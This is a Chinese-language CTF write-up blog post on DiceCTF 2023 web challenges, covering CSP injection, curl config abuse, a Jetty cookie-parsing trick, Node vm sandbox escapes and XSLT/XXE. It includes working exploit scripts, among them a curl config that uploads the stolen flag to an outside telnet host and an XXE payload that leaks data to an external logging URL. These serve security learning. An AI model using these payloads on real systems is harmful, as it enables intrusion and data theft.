---
title: DiceCTF 2023 筆記
catalog: true
date: 2023-03-26 09:10:44
tags: [Security]
categories: [Security]
photos: /img/dicectf-2023-writeup/cover.png
---

雖然過了快兩個月，但還是來補一下筆記。[去年](/2022/02/08/what-i-learned-from-dicectf-2022/)被電得很慘，原本想說過一年了，今年應該會比較好吧，沒想到還是被電爛。

關鍵字：

1. SSRF mongoDB via telnet protocol
2. jetty cookie parser
3. ASI (Automatic Semicolon Insertion)
4. VM sandbox escape via Proxy
5. process.binding
6. 瀏覽器的 XSLT + XXE

開頭先貼一下官方的 repo，裡面有程式碼跟解答：https://github.com/dicegang/dicectf-2023-challenges

<!-- more -->

## Web - codebox (30 solves)

這次唯一有解開的一題，還滿有趣的

後端很簡單，就一個會根據 code 的參數調整 CSP 的功能，可以達成 CSP injection：

``` js
const fastify = require('fastify')();
const HTMLParser = require('node-html-parser');

const box = require('fs').readFileSync('box.html', 'utf-8');

fastify.get('/', (req, res) => {
    const code = req.query.code;
    const images = [];

    if (code) {
        const parsed = HTMLParser.parse(code);
        for (let img of parsed.getElementsByTagName('img')) {
            let src = img.getAttribute('src');
            if (src) {
                images.push(src);
            }
        }
    }

    const csp = [
        "default-src 'none'",
        "style-src 'unsafe-inline'",
        "script-src 'unsafe-inline'",
    ];

    if (images.length) {
        csp.push(`img-src ${images.join(' ')}`);
    }

    res.header('Content-Security-Policy', csp.join('; '));

    res.type('text/html');
    return res.send(box);
});

fastify.listen({ host: '0.0.0.0', port: 8080 });
```

而前端則是長這樣，會把你提供的 code 放到 sandbox iframe 裡面去：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>codebox</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    * {
        margin: 0;
        font-family: monospace;
        line-height: 1.5em;
    }
    
    div {
        margin: auto;
        width: 80%;
        padding: 20px;
    }
    
    textarea {
        width: 100%;
        height: 200px;
        max-width: 500px;
    }

    iframe {
        border: 1px solid lightgray;
    }
  </style>
</head>
<body>
  <div id="content">
    <h1>codebox</h1>
    <p>Codebox lets you test your own HTML in a sandbox!</p>
    <br>
    <form action="/" method="GET">
        <textarea name="code" id="code"></textarea>
        <br><br>
        <button>Create</button>
    </form>
    <br>
    <br>
  </div>
  <div id="flag"></div>
</body>
<script>
    const code = new URL(window.location.href).searchParams.get('code');
    if (code) {
        const frame = document.createElement('iframe');
        frame.srcdoc = code;
        frame.sandbox = '';
        frame.width = '100%';
        document.getElementById('content').appendChild(frame);
        document.getElementById('code').value = code; 
    }

    const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
    document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
  </script>
</html>
```

這題有趣的點在於一開始你會以為它讓你可以改 CSP，是讓你用 `sandbox` 這個 CSP 規則去做一些事情，然後你就可以跳出 sandbox 之類的，但嘗試過後你會發現沒辦法。

正解其實是用 `require-trusted-types-for 'script';` 來讓 `document.getElementById('flag').innerHTML = flag;` 這段被擋下來，再搭配 `report-uri https://vps` 來回報被擋下來的內容，就可以拿到 flag。

還有另一個小地方是 `frame.sandbox = '';` 這段也是歸 `require-trusted-types-for` 管，所以這段會先出錯，因此這段也要跳過。

跳過的方法很簡單，前端的 `searchParams.get()` 如果你有多個 param，吃的會是第一個參數，而後端如果有多個會變成 array，所以傳 `?code=&code=payload` 就可以讓前後端看到的內容不一樣，前端就會認為是空的，跳過那一段。

## Web - unfinished (14 solves)

這題的核心程式碼在這：

``` js
app.post("/api/ping", requiresLogin, (req, res) => {
    let { url } = req.body;
    if (!url || typeof url !== "string") {
        return res.json({ success: false, message: "Invalid URL" });
    }

    try {
        let parsed = new URL(url);
        if (!["http:", "https:"].includes(parsed.protocol)) throw new Error("Invalid URL");
    }
    catch (e) {
        return res.json({ success: false, message: e.message });
    }

    const args = [ url ];
    let { opt, data } = req.body;
    if (opt && data && typeof opt === "string" && typeof data === "string") {
        if (!/^-[A-Za-z]$/.test(opt)) {
            return res.json({ success: false, message: "Invalid option" });
        }

        // if -d option or if GET / POST switch
        if (opt === "-d" || ["GET", "POST"].includes(data)) {
            args.push(opt, data);
        }
    }

    cp.spawn('curl', args, { timeout: 2000, cwd: "/tmp" }).on('close', (code) => {
        // TODO: save result to database
        res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });
    });
});
```

你可以傳入一個 URL 跟 option 來讓它執行 cURL，其中對於參數的檢查可以用 config 繞過，先用 -o 下載 config 並存到一個叫做 `GET` 的檔案，然後再用 `-K` 來使用 config，像這樣：

``` py
import requests
import time

host = 'https://unfinished-27df3c439f8d6dd1.mc.ax'
hook_url = 'https://webhook.site/576f330a-c867-4609-b83f-36bbca32abfe'
config_url = 'https://gist.githubusercontent.com/aszx87410/a0a710f8bcc351958d107924632888c9/raw/54673c647da2ea04e90a1c67c7a40eb7e99320f6/test.txt'

def send_command(url, opt="", data=""):
  if opt == "":
    req_data = {
      "url": url
    }
  else:
    req_data = {
      "url": url,
      "opt": opt,
      "data": data
    }
  resp = requests.post(host + "/api/ping", data=req_data)
  print(resp.status_code)

send_command(hook_url)
time.sleep(5) # need to wait for server restart 

send_command(config_url, "-o", "GET")
time.sleep(5)

send_command(hook_url, "-K", "GET")
time.sleep(5)
```

但這是最簡單的部分，最難的部分是 flag 存在 mongoDB 裡面，所以你要想辦法用 cURL 去 SSRF mongoDB。

喔對了，這題不能用 gopher，因為 gopher 被禁用了。

比賽的時候沒想到怎麼弄，弄不出來，賽後看了其他人的解法，可以用 `telnet` 來做(source: https://discord.com/channels/805956008665022475/805962699246534677/1071901986338897982)：

``` py
import requests
import time

url = 'https://unfinished-9044.mc.ax'

with open('raw_packet.txt', 'wb') as fout:
    fout.write(b'\x92\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xdd\x07\x00\x00\x00\x00\x00\x00\x00\x7d\x00\x00\x00\x02\x66\x69\x6e\x64\x00\x05\x00\x00\x00\x66\x6c\x61\x67\x00\x03\x66\x69\x6c\x74\x65\x72\x00\x05\x00\x00\x00\x00\x10\x6c\x69\x6d\x69\x74\x00\x01\x00\x00\x00\x08\x73\x69\x6e\x67\x6c\x65\x42\x61\x74\x63\x68\x00\x01\x10\x62\x61\x74\x63\x68\x53\x69\x7a\x65\x00\x01\x00\x00\x00\x03\x6c\x73\x69\x64\x00\x1e\x00\x00\x00\x05\x69\x64\x00\x10\x00\x00\x00\x04\xce\x2d\x77\x58\x58\xfd\x41\xc2\x98\xf9')

print('upload packet contents')
res = requests.post('%s/api/ping' % url, data = {
    'url': 'http://[...]/raw_packet.txt',
    'opt': '-o',
    'data': 'GET',
})
assert res.status_code == 200

time.sleep(5)

print('upload curl config')
with open('curl.config', 'wb') as fout:
    fout.write(("""
next
url="telnet://mongodb:27017"
upload-file="GET"
output="flag.txt"
no-buffer
""").strip().encode())

res = requests.post('%s/api/ping' % url, data = {
    'url': 'http://[...]/curl.config',
    'opt': '-o',
    'data': 'POST',
})
assert res.status_code == 200

time.sleep(5)

print('download flag')
try:
    res = requests.post('%s/api/ping' % url, data = {
        'url': 'http://google.com/',
        'opt': '-K',
        'data': 'POST',
    })
    assert res.status_code == 200
except:
    pass

time.sleep(10)

print('upload exfil config')
with open('curl.config', 'wb') as fout:
    fout.write(("""
next
url="telnet://[...]:1337"
upload-file="flag.txt"
""").strip().encode())

res = requests.post('%s/api/ping' % url, data = {
    'url': 'http://[...]/curl.config',
    'opt': '-o',
    'data': 'POST',
})
assert res.status_code == 200

time.sleep(5)

print('exfil')
try:
    res = requests.post('%s/api/ping' % url, data = {
        'url': 'http://google.com/',
        'opt': '-K',
        'data': 'POST',
    })
    assert res.status_code == 200
except:
    pass
```

然後還有一個非預期解，就是用 cURL 下載檔案蓋掉 node_modules 裡的東西，這樣 server 再次啟動時就會載入你寫的 JS，然後就輕鬆拿到 flag 了。

## Web - jnotes (6 solves)

這題是一個 Java web：

``` java
package dev.arxenix;

import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

import io.javalin.Javalin;
import io.javalin.http.Context;
import io.javalin.http.Cookie;

public class App {
    public static String DEFAULT_NOTE = "Hello world!\r\nThis is a simple note-taking app.";

    public static String getNote(Context ctx) {
        var note = ctx.cookie("note");
        if (note == null) {
            setNote(ctx, DEFAULT_NOTE);
            return DEFAULT_NOTE;
        }
        return URLDecoder.decode(note, StandardCharsets.UTF_8);
    }

    public static void setNote(Context ctx, String note) {
        note = URLEncoder.encode(note, StandardCharsets.UTF_8);
        ctx.cookie(new Cookie("note", note, "/", -1, false, 0, true));
    }

    public static void main(String[] args) {
        var app = Javalin.create();

        app.get("/", ctx -> {
            var note = getNote(ctx);
            ctx.html("""
                    <html>
                    <head></head>
                    <body>
                    <h1>jnotes</h1>

                    <form method="post" action="create">
                    <textarea rows="20" cols="50" name="note">
                    %s
                    </textarea>
                    <br>
                    <button type="submit">Save notes</button>
                    </form>

                    <hr style="margin-top: 10em">
                    <footer>
                    <i>see something unusual on our site? report it <a href="https://adminbot.mc.ax/web-jnotes">here</a></i>
                    </footer>
                    </body>
                    </html>""".formatted(note));
        });

        app.post("/create", ctx -> {
            var note = ctx.formParam("note");
            setNote(ctx, note);
            ctx.redirect("/");
        });
        
        app.start(1337);
    }
}
```

雖然說你有個 free XSS，但是 cookie 是 httponly 的，所以你也讀不到。

解法是利用 jetty 奇怪的 cookie parse 行為，如果 cookie 的內容有 `"`，那它會讀到下一個 `"` 為止。

例如說如果有三個 cookie：

1. note="a
2. flag=dice{flag}
3. end=b"

送出的 header 是：`note="a; flag=dice{flag}; end=b"`，最後會被 parse 成一個 `note` 的 cookie，而不是預期的三個 cookie。

所以重點就是創造出這些 cookie 然後讓瀏覽器用我們想要的順序送出。

Chrome 送 cookie 的順序是 path 最長的先，再來是最近更新的，因此只要這樣就好：

``` js
document.cookie = `note="a; path=//`; // use double slash path to get it to appear at start (longest path)
document.cookie = `end=ok;"`; // last cookie (most recently updated)
w = window.open('https://jnotes.mc.ax//')
```

就可以讓 flag 反映在頁面上，進而拿到 flag。

## Web - gift (4 solves)

這題沒仔細看，賽後也還沒研究，只知道有個部分跟 ASI (Automatic Semicolon Insertion) 有關，你看起來是 A，但實際結果是 B，因為 JS 插入分號的機制所導致。

以前也有過類似的題目，滿有趣的，但如果只用肉眼看確實滿難看出來，看來我要再練練了。

## Web - jwtjail (3 solves)

這題真是飲恨啊，該找的都找了，lib 的原始碼我也看過好幾遍了，最後還是沒有做出來，差一點。

程式碼長這樣：

``` js
const jwt = require("jsonwebtoken");
const express = require("express");
const vm = require("vm");

const app = express();

const PORT = process.env.PORT || 12345;

app.use(express.urlencoded({ extended: false }));

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`).runInContext(vm.createContext(Object.create(null), ctx), { timeout: 250 });

process.mainModule = null; // 🙃

app.use(express.static("public"));

app.post("/api/verify", (req, res) => {
    let { token, secretOrPrivateKey } = req.body;
    try {
        token = unserialize(token);
        secretOrPrivateKey = unserialize(secretOrPrivateKey);
        res.json({
            success: true,
            data: jwt.verify(token, secretOrPrivateKey)
        });
    }
    catch {
        res.json({
            success: false,
            data: "Verification failed"
        });
    }
});

app.listen(PORT, () => console.log(`web/jwtjail listening on port ${PORT}`));
```

靠著 vm 把你丟進去的 data 放在另一個 context，然後呼叫 jwt lib，因此目的就是在 jwt lib 處理的過程中找到可以 escape 的地方。

而解法是我們可以幫一個 function 加上 proxy，如果呼叫到 function，就會先呼叫到 proxy 的 apply

``` js
var p = new Proxy(_ => _, {
  apply(target, thisArg, argumentsList) {
    console.log('apply')
  }
})
p() // apply
```

而這個 apply 的第三個參數 `argumentsList` 是來自外界的 object，就可以靠著這個參數來逃出 VM。

除此之外，雖然 `process.mainModule` 被刪掉了，但可以用 `process.binding("spawn_sync")` 來達成執行程式碼。

一個簡單的 PoC 像這樣：

``` js
"use strict";
const vm = require("vm");

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
    .runInContext(
        vm.createContext(Object.create({console}), ctx),
        { timeout: 250 }
    );

var data = `{
    key: {
        toString: new Proxy(_ => _, {
            apply(a, b, c) {
                console.log(c.constructor.constructor("return this")().process.pid)
            }
        })
    }
}`

try {
    data = unserialize(data);
    console.log(data['key'].toString())
} catch(err) {
    console.log(err)
}
```

而賽後的 Discord 討論裡面，也有人提到可以利用雙重 proxy 達成「只要存取 object 的值就可以 escape」，像這樣：

``` js
"use strict";
const vm = require("vm");

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
    .runInContext(
        vm.createContext(Object.create({console}), ctx),
        { timeout: 250 }
    );

var data = `new Proxy({}, {
    get: new Proxy(_=>_, {
        apply(a,b,c) {
            console.log(c.constructor.constructor("return this")().process.pid)
        }
    })
})`

try {
    data = unserialize(data);
    data['key'];
} catch(err) {
    console.log(err)
}
```

作者 writeup：https://brycec.me/posts/dicectf_2023_challenges

## Web - impossible XSS (0 solves)

這題很酷，程式碼很簡單：

``` js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
app.use(cookieParser());

app.get('/', (req, res) => {
    // free xss, how hard could it be?
    res.end(req.query?.xss ?? 'welcome to impossible-xss');
});

app.get('/flag', (req, res) => {
    // flag in admin bot's FLAG cookie
    res.end(req.cookies?.FLAG ?? 'dice{fakeflag}');
});

app.listen(8080);
```

你有一個 free xss，但是在 admin bot 裡面有一行 `await page.setJavaScriptEnabled(false);`，直接把 JS 關掉。

解法是用 XSLT 加上 XXE，像這樣：

``` js
ss = `<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY xxe SYSTEM  "https://impossible-xss.mc.ax/flag" >]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/asdf">
    <HTML>
      <HEAD>
        <TITLE></TITLE>
      </HEAD>
      <BODY>
        <img>
          <xsl:attribute name="src">
            https://hc.lc/log2.php?&xxe;
          </xsl:attribute>
        </img>
      </BODY>
    </HTML>
  </xsl:template>
</xsl:stylesheet>`

xml=`<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${btoa(ss)}"?>
<asdf></asdf>`
payload=encodeURIComponent(xml)
```

作者的 writeup：https://blog.ankursundara.com/dicectf23-writeups/
